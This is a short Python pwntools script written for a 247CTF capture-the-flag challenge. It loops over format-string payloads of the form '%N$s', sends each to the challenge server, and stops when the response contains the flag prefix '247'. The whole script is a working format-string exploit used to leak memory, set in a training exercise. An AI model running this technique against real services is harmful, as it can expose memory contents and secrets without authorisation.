from pwn import *

url = "9db254d93fe35ff6.247ctf.com" #change this
port = 50349 #change this

for i in range(50, 100):
    r = remote(url, port)

    payload = b'%' + str(i).encode() + b'$s'
    log.info(payload)
    r.sendlineafter('again?', payload)

    r.recvline()
    response = r.recvline()

    if b'247' not in response:
        print(response)
        continue
    else:
        print(response)
        break